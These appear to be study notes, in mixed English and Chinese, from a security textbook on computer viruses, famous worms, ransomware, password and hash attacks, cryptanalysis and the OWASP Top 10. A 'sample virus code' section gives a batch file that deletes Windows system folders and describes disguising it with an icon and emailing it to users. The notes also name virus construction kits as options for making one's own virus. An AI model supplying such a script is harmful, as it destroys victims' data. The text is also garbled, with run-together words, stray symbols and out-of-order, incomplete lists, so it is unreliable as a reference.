Fortunately, most conventional antivirus software will detect and block these types of attacks new Attacks on the way
New methods for dealing with and counteracting attacks are being developed even as you read this book.
first when confronting an attack is to recognize the battle on two fronts:
  - The first front: involves the inherent open nature of TCP/IP and its protocol suite.
  - TCP/IP is a robust and rich environment
  - allows many opportunities to exploit the vulnerabilities of the protocol
suite.
  - The second: the implementation of TCP/IP by various vendors.
  - A weak TCP/IP implementation will be susceptible to all forms of attacks
  - Little able to do except to complain to the software manufacturer. Fortunately, most of the credible manufacturers are now taking these complaints seriously and
doing what they can to close the holes that they have created in your systems.
Keep your updates current because this is where most of the corrections for security problems are implemented.
Virus
since the early '70s, though the theory of self-replicating computer programs has been around since 1949.
- An early example of virus: Creeper, infected systems on the ARPAnet.
  - did nothing but replicate itself, no damage other than the time it
took to isolate and remove it.
  - not inconsequential, can be very time-consuming.   - No files were deleted by Creeper and no systems were rendered unusable.
- The first virus on the PC: Elk Cloner.
  - did nothing but copy itself to any floppy disks inserted into the
system.
  - Those floppy disks would then be taken to other systems.
- a specific type of malware
  - malware includes many other: worms, logic bombs, Trojans,
ransomware, rootkits, spyware...
  - not all malware is a virus, but all computer viruses are malware
A virus is a self-replicating program that reproduces its code by attaching copies into other executable codes, create copies of themselves in other programs, then activate on some sort of trigger event (such as a specific user task, a particular time, or an event of some sort).
They usually get installed on a system via file attachments, user clicks on embedded e-mails, or the installation of pirated software, and while some are nothing more than just annoyances, many cause substantial harm to the system and, if you’re crazy enough to pay for it, financial loss to the system owner.
- malicious code: attaches itself to a host application. Generate copy spread file to file.
- require interaction of an individual to infect a system, user has to execute the virus: so spread very slow. executes when the host application is executed.
  - Once that happens, the virus will infect the system, possibly by injecting code into other programs so when those programs run, the virus still retains control of the infected system.
  - Every time the infected programs are run, the system will get reinfected, even if the original executable and process are removed.
  - to remove a virus, all instances of it need to be removed. Regardless of the virus and what it does, there are some elements that are
common.
- ability to identify a program to infect and copy itself into that program.
  - Not just infect a single program and stop, it will place multiple copies of itself onto the file system.
  - Example: I Love You virus, replaced media files, same name but addition of .vbs, meaning it was a Visual Basic Script (VBScript) file.
  - Anytime someone attempted to look at one of their photos, they actually executed a VBScript instead, ensuring that the system got reinfected.
- have dormant phases, inactive, waiting for a trigger.
  - triggering phase: triggered by a user action or some other defined
event.
  - could be opening an email, file, or reach certain date and time.
  - Viruses that wait for a specific time are sometimes called logic bombs. ⁃
  -   -   -   -   - ⁃
  - ⁃
propagation phase: spread itself to infect other files / programs (send itself over email to other victims)
execution phase: does what it was written to do. (malicious, benign, nuisance.)
Virus生命週期: Design:開發virus Replication:大量複製 Launch:執行惡意動作 Detection:被偵測到惡意的行為 Incorporation:被隔離 Elimination:重寫virus
- A virus may be memory resident.
  - when it infects a system, it remains in memory.
  - installs itself as part of the operating system, loads into memory when the system boots and remains there until it shuts down.
  - As they are always running, memory resident viruses can scan, infect, and reinfect
as needed.
  - If it is nonresident, the virus has to be executed . The virus executes, scans, and infects as necessary, then executes.
  - Example: macro virus.
- Typically,thepayloadofavirusisdamaging.Itmaydeletefiles,cause random
reboots,jointhecomputertoabotnet,orenablebackdoorsthat attackerscanuse ▪


## to access systems remotely. Some older viruses merely displayed a message at some point, such as “Legalize Marijuana!”
- Most won’t cause damage immediately, replicate first.
  - replicate byfinding other host applications to infect with the malicious
code. At some point, the virus activates and delivers its payload.
  - A user will often execute the virus (though unknowingly), but other times, an operating system will automatically execute it after user interaction.
  - Example, when a user plugs in an infected USB drive, the system might automatically execute the virus, infecting the system.
method for getting viruses onto a system virus hoax or fake antivirus.
how to know your system has actually been infected?
- obvious things: slower response time, computer and browser freezes, and repeated, continual hard drive accesses should be indicators.
- not be as immediately obvious: drive letters might change and files and folders may disappear or become inaccessible.
- In any event, recovery may be as simple as a minor cleaning effort using software designed to clean the infection, or a major undertaking including reloads from known good backups.
 Types of Viruses
病毒的分類:
1. File and Multipartite Virus:感染可執行檔，或同時感染boot
sector與可執行檔
2. System(Boot) Sector Virus:改變MBR的位置，讓病毒碼優先執
行
  - Working just like the boot sector virus, this virus type wraps itself around an application’s code, inserting its own code before the application’s.
 A self-replicating computer program containing malicious segment Requires its host application to be run to make the virus active
Attaches itself to an application program or other executable component
first.
⁃
4.
  - ⁃
Every time the application is run, the virus code is run
Multipartite virus
Attempts to infect both files and the boot sector at the same time.
This generally refers to a virus with multiple infection vectors.
3. Shell Virus:會執行Shell code.
It was multipartite, polymorphic, retroviral, boot sector,
⁃
and generally a pretty wild bit of code.   - modifies directory table entries so that user or system processes are pointed to the virus code itself instead of the application or action intended.
  - A single copy of the virus “infects” everything by launching when any application is initiated.
6. Macro Virus:針對如微軟的Word或Excel的巨集去感染
7. Stealth/Tunneling Virus:病毒會餵給防毒軟體一個未感染的檔
案
特徵
10. Metamorphic Virus:變態病毒，每次改染會改變自己很多的特 徵
  - rewrites itself everytime it infects a newfile.
11. File Overwriting / Cavity 洞 Virus:病毒會插在儲存空間的空隙
12. Sparse Infector Virus:只會在特定時間點或特定檔案大小時才
會去感染
13. Companion/Camouflage Virus:偽裝成合法的應用程式
14. File Extension Virus:會隱藏副檔名
  - 如原檔名為virus.txt.vbs，但在微軟系統中只會看到virus.txt
  - change the file extensions, most people having file extension view turned off.
15. Add-on Virus:不會改變宿主的code
16. Intrusive Virus:改變宿主部分或全部的code
17. Direct Action or Transient Virus:感染目標的記憶體，當host
 8. Encryption Virus:把檔案做加密
9. Polymorphic Code:變形病毒，每次感染時會改變一點自己的 ▪


## code執行時才會發作
18. Terminate and Stay Resident(TSR) Virus:永久感染目標的記憶 體
19. Cavity Virus:覆寫主機檔案內容，不會增加檔案大小或修改功 能, 把原檔案內容吃掉在放入他自己,使檔案大小一樣, the virus overwrites a
part of the host file that is filled with a constant,without increasing the length of the file,but preserving its functionality
20. Sparse infector virus: These only infect occasionally.
  - Example
  - maybe the virus only fires every tenth time a specific application is run.
the most popular virus family is the CIH virus
NOTE
Want to make your own virus, for whatever reason? Some options for you include, but are not limited to, Sonic Bat, PoisonVirus Maker, Sam’s Virus Generator, and JPS Virus Maker.
Polymorphic Virus/malware
only ones truly prevalent—change form in order to avoid detection.
These types of viruses:
  - attack your system,
  - display a message on your computer,
   ▪


##   - delete files on your system.
  - attempt to hide from your antivirus software.
  - encrypt parts of itself to avoid detection.
  - When the virus does this, it’s referred to as mutation 突变.
  - makes it hard for antivirus software to detect common characteristics of the virus.
  - change a signature to avoid antivirus software (common) This virus mutates its code using a built-in polymorphic engine.
is difficult to find and remove because its signature constantly changes.
No part of the virus stays the same from infection to infection.
- since it compares the signatures of executable files to the database of known viral signatures
- cannot be detected by a signature-based anti-virus program
present Virus Activity
CERT/CC Current Activity web page
www.us-cert.gov/ current/current_activity.html.
most current viruses as well as links to pages on older threats.
Stealth 剽窃 Virus
   polymorphic virus has the ability to mutate and can change its known viral signature and hide from signature- based antivirus programs. ▪


##  attach itself to the boot sector of the hard drive. avoid detection by masking itself from applications.
  - When a system utility/program runs, the stealth virus redirects commands around itself in order to avoid detection.
  - An infected file may report a file size different from what is actually present in order to avoid detection.
  - may move themselves from fileA to fileB during a virus scan. ⁃
known as a “tunneling virus,”
  - attempts to evade antivirus (AV) applications by intercepting the AV’s requests to the operating system (OS) and returning them to itself instead of the OS.
  - The virus then alters the requests and sends them back to AV as uninfected, making the virus now appear “clean.”
Ransomware
A specific type of Trojan
Malicious Software (often delivered through a Trojan)
crypto-malware
takes control of a system, locks you out of your own system resources,
  hide from anti-virus programs by actively altering
and corrupting the chosen service call
interruptions when they are being run.
     ▪


## demands that a third party be paid.
- The ransomeware “family” includes examples such as Cryptorbit,
CryptoLocker, CryptoDefense, and police-themed.
The “control”:
  - encrypting the hard drive
  - Ransomware that encrypts the user’s data is sometimes called crypto-malware.
  - changing user password information
  - Some ransomware add a new blackmail technique: doxing.
  - If the user doesn’t pay the ransom to decrypt the files, the attacker threatensto publish the files along with the victim’s credentials.
  - Malware that uses doxing is sometimes called doxingware.
⁃...
Users are usually assured that by paying the extortion amount (the ransom), they
will be given the code needed to revert their systems to normal operations.
  開機型病毒(Boot Strap Sector Virus) ▪


##  Also known as a system virus
infects the boot sector of floppy disks or the Master Boot
Record (MBR) of hard disks (some infect the boot sector of the hard disk instead of the MBR).
Moves the MBR to another location on the hard disk, and copies itself to the original location of the MBR, forcing the virus code to
be executed first.
These viruses are almost impossible to get rid of once you get
infected. You can re-create the boot record—old-school fdisk or mbr could do the trick for you—but it’s not necessarily a walk in thepark.
The infected code runs when the system is booted from an
infected disk, but once loaded it will infect other floppy disks when accessed in the infected computer.
While boot sector viruses infect at a BIOS level, they use DOS
commands to spread to other floppy disks. For this reason, they started to fade from the scene after the appearance of Windows 95 (which made little use of DOS instructions).
Today, there are programs known as ‘bootkits’ that write their
code to the MBR as a means of loading early in the boot process and then concealing the actions of malware running under Windows. However, they are not designed to infect removable media.
The only absolute criteria for a boot sector is that it must
contain 0x55 and 0xAA as its last two bytes. If this signature is not present or is corrupted, the computer may display an error message and refuse to boot. Problems with the sector may be due to physical drive corruption or the presence of a boot sector virus.
       ▪


## How Boot Sector Viruses are Spread and How to Get Rid of Them
Boot sector computer viruses are most commonly spread using physical media. An infected floppy disk or USB drive connected to a computer will transfer when the drive's VBR is read, then modify or replace the existing boot code. The next time a user tries to boot their desktop, the virus will be loaded and run immediately as part of the master boot record. It's also possible for email attachments to contain boot virus code. If opened, these attachments infect the host computer and may contain instructions to send out further batches of email to a user's contact list. Improvements in BIOS architecture have reduced the spread of boot viruses by including an option to prevent any modification to the first sector of a computer's hard drive.
Removing a boot sector virus can be difficult because it may encrypt the boot sector. In many cases, users may not even be aware they have been infected with a virus until they run an antivirus protection program or malware scan. As a result, it is critical for users to rely on continually updated virus protection programs that have a large registry of boot viruses and the data needed to safely remove them. If the virus cannot be removed due to encryption or excessive damage to existing code, the hard drive may need reformatting to eliminate the infection.
Armored virus
designed to make itself difficult to detect or analyze.
cover themselves with protective code that stops debuggers 调试器 or
disassemblers 反汇编程序 from examining critical elements of the virus.   - Example: some aspects of the programming act as a decoy 诱饵 to
distract from analysis while the actual code hides in other areas in the
   ▪


## program.
For creator, more time it takes to deconstruct the virus, longer it can live, more time it has to replicate and spread to other machines.
The key to stopping most viruses is to identify them quickly and educate administrators about them (the very things that the armor intensifies the difficulty of accomplishing).
RetroVirus
directly attack the antivirus software to create bypasses for itself. potentially destroy your virus definition database file.
leave you with a false sense of security.
Companion Virus
reside in your system’s temporary directory.
Attaches itself to legitimate programs, creates a program with a different filename extension.
When types the name of the legitimate program, the companion virus executes instead of the real program.
This effectively hides the virus from the user.
Many of the viruses that are used to attack Windows systems make changes to
program pointers in the Registry so that they point to the infected program. The infected program perform its dirty deed, and then start the real program.
Macro Virus
exploits the enhancements made to many application programs that are used by 1,360

▪
programmers to expand the capability of applications like Word and Excel.
  - Example:
  - Word supports a mini-BASIC programming language, allows files to be manipulated automatically. These programs in the document are called macros.
  - a macro can tell your word processor to spell-check your document automatically when it opens.
executes as a script as part of a document. Word documents
  - short scripts that launch and are executed when the document is
opened.
  - This virus could be spread by attaching to the macro and then just
sending the document around .
  - Many formats support script execution: PDF...
Macro viruses can infect all of the documents on your system and spread to other systems via email or other methods.
usually written with Visual Basic for Applications (VBA).
- This virus type infects template files created by Microsoft Office, normally Word and Excel. The Melissa virus was a prime example of this.
Multipartite 分成多部分的 Virus
attacks your system in multiple ways. It may attempt to
     - ▪


##   - infect your boot sector,
  - infect all of your executable files,
  - destroy your application files.
The hope here is that you won’t be able to correct all of the problems and this will allow the infestation to continue.
Phage 噬菌体 Virus
modifies and alters other programs and databases. The virus infects all of these files.
only way to remove: reinstall the programs that are infected.
  - miss even a single incident of this virus
  - the process will start again and infect the system once more.
Cavity Virus: 覆寫主機檔案內容，不會增加檔案大小或修改功
能,
filled with a constant, without increasing the length of the file, but preserving its functionality
ps:the most popular virus family is the CIH virus
overwrite portions of host files so as not to increase the 1,362
     把原檔案內容吃掉在放入他自己,使檔案大小一樣,
the virus overwrites a part of the host file that is

▪
actual size of the file.
  - This is done using the null content sections of the file and leaves the file’s actual functionality intact.
File Infector Virus:
通常寄生在可執行檔中, ex:COM,EXE,... 當這些檔案被執行時, 病毒的程式就跟著被執行 可在分成以下兩種 :
Non-memory Resident Virus(非常駐型病毒) :
  - 寄生在COM,EXE,SYS的檔案中,
  - 當這些中毒的程式被執行時,就會嘗試地去傳染給
別的檔案。
Memory Resident Virus(常駐型病毒) :
  - 寄生在記憶體中, 只要任何執行檔被執行, 它就對
其進行感染的動作
famous viruses and worms i love you virus
melissa virus
js.spth
klez
     slammer worm mydoom.b:
latest virus: w32/vulgar w32/hllp.zori.c@m w32/feebs.gen@mm
win32.autorun.ah
w32/virut: 感染exe,scr w32/divvi worm.symbos.lasco.a:使用藍芽 disk killer
bad boy
happy box java.strangebrew montecarlo family php.neworld: 感染include w32/wboy.a
exebug.d w32/voterai.worm.e w32/lecivio.worm w32/lurka.a w32/vora.worm!p2p
...
Melissa
時間:1999年3月
感染平台:windows
a microsoft word macro virus
攻擊Microsoft Word的全球模板Normail.dot，所有新建立的檔案都被感染 感染的電腦會
將自己寄給所有outlook上的前50個user
ILOVEYOU 或稱VBS/Loveletter或Love Bug worm 時間:2000年5月
感染平台:windows 使用VBScript和社交工程概念 感染的電腦會 將自己寄給所有outlook上的user 偷聽使用者密碼並mail給攻擊者
sadmind
中譯:悲傷心情蠕蟲
時間:2001年5月
感染平台:SUN上Solaris,IIS ps:相關說明在SUN上Solaris(資訊安全告示區00191),及(MS00-078)
codered
中譯:紅色警戒
時間:2001年7月
感染平台:windows 2000 server
攻擊Microsoft IIS的Index Server ISAPI Extension漏洞 ps:相關說明在MS01-033 特徵:試圖從80port呼叫irq.dll
nimda
中譯:娜妲蠕蟲
時間:2001年9月 特色:多點攻擊最佳代表(透過網芳,電郵,iis感染) 使用unicode directory traversal vulnerability攻擊iis server ps:相關說明在MS01-044
ps:會利用了 coderedII,sadmind留下的後面
Klez
時間:2001年10月
a memory-resident mass-mailing worm 感染的電腦會 將自己寄給所有outlook上的user
SQL slammer
中譯:藍寶石蠕蟲
時間:2003 年1月
攻擊Microsoft SQL Server與MSDE的漏洞 ps:詳情公佈於MSDE described in MS02-039與MS02-061 ps:spread of slammer worm in 30min,受害設備還包括atm
Blaster(Worm.Blaster,Lovesan) 中譯:衝擊波蠕蟲,疾風病毒 感染平台:Windows XP,Windows 2000 時間:2003年8月
使用DCOM RPC 出現的buffer overflow漏洞 感染的電腦會
系統被強制60秒後關機 對windowsupdate網站進行ddos攻擊 使用135port進行感染
ps: 此漏洞的修補檔已在一個月之前就已公佈在MS03-026以及MS03-039上 ps:本蠕蟲第一次被注意並如燎原火般散佈，是在2003年的8 月11日。它不 斷繁植並感染，在8月13日達到高峰，之後藉助ISP與網路上散佈的治療方法 阻止了此蠕蟲的散佈
MyDoom 中譯:世界末日蠕蟲 感染平台:windows 時間:2004年1月
a mass-mailing worm,創下最快散播速度的郵件病毒記錄 感染電腦會
perform dos attack
建立 backdoor,預設open tcp1080
修改檔案host sasser
中譯:殺手蠕蟲,震盪波
感染平台:windows
時間:2004年5月
針對lsass(local security authority subsystem service)漏洞 感染的電腦會:
若連上網路後會強制60秒後重啟 隨機掃描網路中電腦的ip,然後使用445port進行感染 ps:相關說明在MS04-011
zotob
中譯:幽靈蠕蟲
時間:2005年8月
感染平台:windows
使用plug and play弱點,允許遠端執行程式碼及提高權限 感染的電腦會:
使用445port進行感染
ps:相關說明在MS05-039
........................................................................................................................ ............
writing a sample virus code
1
create a batch file with the following:
text @ echo off
delete c:winntsystem32*.* /y
delete c:winnt*.* /y
2
使用bat2com utility,...等工具轉換檔案 設定一個icon後寄出,當 user收到並執行,系統將被delete
virus construction kits:
kefi's html virus construction kit virus creation laboratory v1.0 the smeg virus construction kit rajaat's tiny flexible mutator v1.1 windows virus creation kit v1.00
other tools
batch virus generator v1.1c
virus creation laboratory v1.0
nuke genvirus
instant virus production kit v1.7 macro virus development kit v1.0b nuke randomic life generator v0.66b rajaat's tiny flexible mutator v1.1
g2 phalcon/skism's
the super appending batch vck v1.1k skamwerks labs
trojan horse construction kit v2.0
the simple winscript virus kit v1.1k vbs worm generator v2.0 beta
virus factory
genna spy worm generator 2000
........................................................................................................................ .......................................................
virus detection:
scanning
advantages:可簡單的掃描到所有己知的惡意程式 drawbacks:惡意程式變化太快,可能無法掃描到最新的
integrity checking
 可偵測系統上unauthorized change或modification of binary file interception
monitor os request that write to disk
分析tool:
sheep dip:like honeypot ida pro tool:virus analysis,報告virus如何執行,...等 ollydbg:virus content dynamic analysis CWSandbox:上傳程式分析
online virus testing
ex:檔案掃毒網站 www.virustotal.com
...........
anti-virus software:
avg antivirus
norton antivirus
mcafee
socketshield
bitdefender: 行為分析不錯,有自己的sandbox ca anti-virus
f-secure
kaspersky anti-virus:執行需耗大量資源 panda
avast!virus cleaner
antivir personal edition
bootminder
panda active scan
ps:
測試防毒程式的是否work
1新增檔案EICAR.COM
2 內容為X5O!P%@AP[4PZX54(P^)7CC)7}$EICAR-STANDARD- ANTIVIRUS-TEST-FILE!$H+H*
virus database:
proland:www.pspl.com/virus_info norman:www.norman.com/virus/en-us avg:www.grisoft.com/doc/virus encyclopaedia/lng/us/tpl/tpl01 virus bulletin:www.virusbtn.com/login
f-secure virus info center:www.f-secure.com/vir-info ▪


## Managing Spam to Avoid Viruses
Although spam is not truly a virus or a hoax, but annoying things
Spam 垃圾信息
defined as any unwanted, unsolicited email, irritating sheer volume,
also often open the door to larger problems.
Example: sites advertised in spam may be infected with viruses, worms. If users begin to respond to spam by visiting those sites, then viruses and other problems will multiply in your system.
Just as you can, and must, install good antivirus software programs, you should also consider similar measures for spam.
Filtering the messages out and preventing them from ever entering the network
(most effective method).
Recently, the word spam has found its way into other forms of unwanted messaging beyond email, SPIM (spam over instant messaging) and SPIT (spam over Internet telephony).
Antispam programs are available,
but false positives are one of the biggest problems.
occasionally flag legitimate email as spam and stop it from being delivered.
routinely check your spam folders, if legitimate email is being inadvertently flagged as junk.
         ▪


## Antivirus Software
antivirus software
primary method: prevente the propagation of malicious code Application installed to protect it and to scan for viruses Antivirus software looks for these characteristics, fingerprints,
     -   - ⁃
Most viruses have common characteristics.
to identify and neutralize viruses before they impact you.
preventive and corrective logical control at the same time.
  Most of the newer antivirus packages now look for problems with cookies as well.
Antivirus software manufacturer work very hard to keep the definition database files current.
contains all the known viruses, countermeasures for a particular antivirus software product.
You probably won’t receive a virus that hasn’t been seen by one of these compa- nies. If you keep the virus definition database files in your software up-to-date, you prob- ably won’t be overly vulnerable to attacks.
The best method of protection is to use a layered approach. Antivirus software should be at the gateways, at the servers, and at the desktop.
user education.
The second method Teach your users
     ▪


##  scan every disk, email, and document they receive before they open them.
verify the security settings are high within the applications that your users are using.
how to Stop a Virus or worm That is out of Control
A large private university has over 30,000 students taking online classes. These students use a variety of systems and network connections. The instructors at this university are being routinely hit with the Klez32 virus. Klez32 (specifically, in this case, the W32/Klez. mm virus) is a well- known and documented virus. It uses Microsoft Outlook to spread. It grabs a name randomly from the address book, and it uses that name in the header. The worm part of it then uses a mini- mailer and mails the virus to all the people in the address book. When one of these users opens the file, the worm attempts to disable their antivi- rus software and spread to other systems. Doing so opens the system to an attack from other viruses, which might follow later.
You’ve been appointed to the IT department at this school, and you’ve been directed to solve this problem. Take a moment to ponder what you can do about it.
If you think the best solution would be to install antivirus software that scans and blocks all emails that come through the school’s servers, you are right. You should also inspect outgoing email and notify all internal users of the system when they attempt to send a virus-infected document using the server.
These two steps—installing antivirus scanners on the external and internal connections and notifying unsuspecting senders—would greatly reduce the likelihood that the virus could attack either student or instructor computers.
Password Attacks
Password attacks: attempt to discover or bypass passwords used for authentication on systems and networks, and for different types of files.
密钥通过非密码分析方式的丢失叫做泄露(compromise)。 对密码进行分析的尝试称为攻击(attack)
 Password Hashes
Most systems don’t store the password, but store a hash of the password.
Hash attacks: attack the hash of a password instead of the password.
A hash: a number created with a hashing algorithm such as Message Digest 5 (MD5) or Secure Hash Algorithm 3 (SHA-3).
A system can use a hashing algorithm such as MD5 to create a hash of a password.
Example:
password is IC@nP@$$S3curity+
the MD5 hash is 75c8ac11c86ca966b58166187589cc15.
Later, a user authenticates with a username and password.
The system then calculates the hash of the password that the user entered, and compares the calculated hash against the stored hash.
If they match, it indicates the user entered the correct password.
tools are available to discover many hashed passwords. Example
  - MD5 Online (http://www.md5online.org/)
  - allows you to enter a hash and it gives you the text of the password.
  - MD5 Online uses a database of hashed words from a dictionary.
  - If the hash matches a database entry, the site returns the password.
The password is rarely sent across the network in cleartext.
protocol analyzers: attacker can capture and view a password if it is sent across a network in cleartext.
  - To prevent this, a protocol can calculate the hash of the password, send the hash across the network instead of the password.
  - But if send the hash in plaintext, the attacker may be able to capture the hash and use it to log on to a system.
Instead, most authentication protocols encrypt the password / hash before 1,373

sending it across thenetwork.
Pass the Hash Attacks
pass the hash attack: attacker discovers the hash of password and then uses it to log on to the system as the user.
Any authentication protocol that passes the hash over the network in an unencrypted format is susceptible to this attack.
However, it is most associated with Microsoft LAN Manager (LM) and NT LAN Manager (NTLM), two older security protocols used to authenticate Microsoft clients. Any system using LM or NTLM is susceptible to a pass the hash attack.
The simple recommended solution: use NTLMv2 or Kerberos instead. NTLMv2:uses a number used once (nonce) on both the client and the authenticating
server.
  - The authentication process uses both the client nonce and the server
nonce in a challenge/response process.
But, many existing applications still use NTLM, enabled on many Windows
systems for backward compatibility.
However, Microsoft recommends configuring clients to only send NTLMv2 responses and configuring authenticating servers to refuse any use of LM or NTLM.
This is relatively easy to do via a Group Policysetting.
Birthday Attacks
birthday attack:
named after the birthday paradox in mathematical probability theory.
birthday paradox: any 23 people, a 50 percentchance that 2 of them have the same birthday. In a birthday attack, an attacker is able to create a password that produces the same hash as the user’s actual password. This is also known as a hash collision.
hash collision: when the hashing algorithm creates the same hash from different
passwords. This is not desirable. Example:
a simple hashing algorithm creates three-digit hashes. “success” create hash of 123, “passed” create the same hash of 123.
an attacker could use “success” / “passed” as the password, both work.
Solution:
increasing the number of bits used in the hash to increase the number of possible
hashes.
Example
MD5 algorithm: uses 128 bits, is susceptible to birthday attacks. SHA-3: use 512 bits, it is not susceptible to birthday attacks.
Rainbow Table Attacks
rainbow table: a huge database of precomputed hashes.
1. The application guesses a password (or uses a password from a dictionary).
2. The application hashes the guessed password.
3. The application compares the original password hash with the guessed password hash. If they are the same, the application now knows the password.
4. If they aren’t the same, the application repeats steps 1 through 3 until finding a match.
5. the most time-consuming part is hashing the guessed password in step 2.
6. rainbow tables eliminate this step.
7. Rainbow tables: huge databases of passwords and calculated hashes. Some 160 GB, include hashes for every possible combination of characters up to eight characters in length.
8. Larger rainbow tables are also available using more characters.
Rainbow table attacks:
discover the password from the hash.
has the hash of a password, compares the hash of the original password against hashes stored in the rainbow table.
When the application finds a match, it identifies the password used to create the hash (or at least text that can reproduce the hash of the original password).
simplistic explanation, adequate unless you plan on writing an algorithm to create your own rainbow table attack software.
Solution:
Salting passwords: preventing rainbow table attacks, and other password attacks
like dictionary attacks.
Salt: a set of random data such as two additional characters.
Password salting adds these additional characters to a password before hashing
it.
  - add complexity to the password
  - also result in a different hash than the system would create using only
the original password.
  - causes password attacks that compare hashes to fail.
bcrypt and Password-Based Key Derivation Function2 (PBKDF2).
  - Both use salting to increase the complexity of passwords
  - thwart brute force and rainbow table attacks.
Brute Force Attacks
brute force: uess all possible character combinations. 2 types: online and offline.
online password attack
  - attempts to discover a password from an online system.
  - Example: try to log on to an account by repeatedly guessing the
username and password.
  - Many tools to automate the process.   - Example:
  - Ncrack: free tool, run online brute force password attacks.
  - Solution:
  - Individual services often have their own settings to prevent brute force attacks.
  - account lockout policies locks after enters the incorrect password a preset number of times.
  - Secure Shell (SSH): disconnect if hasn’t logged on within 60 seconds and limit the number of authentication attempts per connection.
Offline password attacks:
  - attempt to discover passwords from a captured database or packet scan.
  - Example
  - when attackers hack into a system or network causing a data breach, they can download entire databases.
  - They then perform offline attacks to discover the passwords contained within the databases.
  - Solution:
  - use complex passwords
  - store the passwords in an encrypted / hashed format
Dictionary Attacks ▪


##  one of the original password attacks.
uses a list of words and character combinations. attempts every word in the dictionary to see if it works.
Solution: complex passwords, not include words in a dictionary.
Hybrid attack
- password cracking technique works like dictionary attack
- but adds some numbers and symbols to the words from the dictionary and tries to crack the password
Replay Attacks
replay attack:
- attacker replays data that was already part of a communication session.
- a third party attempts to impersonate a client that is involved in the original session.
- can occur on both wired and wireless networks.
effective countermeasure against replay attacks
- Digital signatures
- Time Stamps
- Sequence numbers
- Many protocols use timestamps and sequence numbers to thwart replay attacks.
- Example:
   ▪


## - Kerberos, prevent replay attacks with timestamped tickets. Known PlaintextAttacks
Many cryptographic attacks attempt to decrypt encrypted data.
known plaintext attack: attacker has samples of both the plaintext and the ciphertext.
- 得到一些消息的密文，而且也知道这些消息的明文。
- Example:
- an attacker captures an encrypted message (the ciphertext) and knows the plaintext of the message,
- he can discover the encryption and decryption method.
- If successful, he can use the same decryption method on other ciphertext.
推导出
chosen plaintext attack: the attacker doesn’t have all plaintext.
- 得到一些消息的密文和相同的明文，还可以选择被加密的明文。
   这比已知明文攻击更加有效，
- the attacker can try various methods to decrypt the chosen plaintext
- When success, use the same method to decrypt the entire message.
自适应选择明文攻击(adaptive-chosen-plaintext attack)。这是选择明文 1,379

▪
攻击的特殊情况。密码分析者不仅能够选择被加密的明文，还可以基于以前
加密的结果修正这个选择。
   在选择明文攻击中，可以选择一大块被加密的明文。
   在自适应选择明文攻击中，可以选择较小的明文块，然后再基于第一
   块的结果选择另一个明文块，以此类推。
ciphertext only attack: the attacker doesn’t have any plaintext.
- 密码分析者有一些消息的密文，这些消息都用相同的加密算法进行加 密。密码分析者的任务就是恢复尽可能多的明文，或者最好能推算出 加密消息的密钥，以便可采用相同的密钥破解其他被加密的消息。
- Known plaintext and chosen plaintext attacks almost always successful with resources and time.
- But ciphertext only attacks only successful on weak encryption algorithms.
- They can be thwarted by not using legacy and deprecated encryption
algorithms.
Chosen ciphertext attack 选择密文攻击 能选择不同的被加密的密文，并得到对应的明文。
推出:K。
   这种攻击主要用于公开密钥算法。选择密文攻击有时也可以有效的用
   于对称算法。
       - ▪


## 注:有时选择明文攻击和选择密文攻击一起称为选择文本攻击 (chosen-text attack)。
选择密钥攻击(chosen-key attack)。 这种攻击并不表示密码分析者能够选择密钥，其只是表示密码分析者
   具有不同密钥之间关系的有关知识。
   此种方法比较晦涩和奇特，并不是很实际。
软磨硬泡攻击(rubber hose cryptanalysis)。 密码分析者威胁、勒索，或者通过折磨某人，直到其给出密钥为止。
购买密钥攻击(purchase-key attack)。 通过行贿获取密钥
   是非常有效的攻击，并经常是破译算法的最便捷途径。
Open Web Application Security Project (OWASP)
an online community
produces freely-available articles, methodologies,
       ▪


## documentation, tools, and technologies in the field of web application security
OWASP Top Ten:
  - 每年的一份关于web应用的十大威胁安全报告，会在经 过安全专家的测验之后确定十大类对当前web应用威胁最大和被应 用最广的漏洞，同时也会对其进行详细的分析威胁所在。
Top 10 Web Application Security Risks 2017
1. Injection. Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.
⁃
2. Broken Authentication. Application functions related to
authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently.
3. Sensitive Data Exposure. Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data may be compromised without extra protection, such as encryption at rest or in transit, and requires special precautions when exchanged
 with the browser.
4. XML External Entities (XXE). Many older or poorly
configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks.
5. Broken Access Control. Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users’ accounts, view sensitive files, modify other users’ data, change access rights, etc.
6. Security Misconfiguration. Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information. Not only must all operating systems, frameworks, libraries, and applications be securely configured, but they must be patched/upgraded in a timely fashion.
7. Cross-Site Scripting XSS. XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites. ▪


## 8. Insecure Deserialization. Insecure deserialization 反序列化 often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.
9. Using Components with Known Vulnerabilities. Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.
10. Insufficient Logging & Monitoring. Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.
OWASP Software Assurance Maturity Model: The
Software Assurance Maturity Model (SAMM) project is committed to building a usable framework to help organizations formulate and implement a strategy for application security that is tailored to the specific business risks facing the organization.
OWASP Development Guide: The Development Guide provides practical guidance and includes J2EE, ASP.NET, and
 ▪


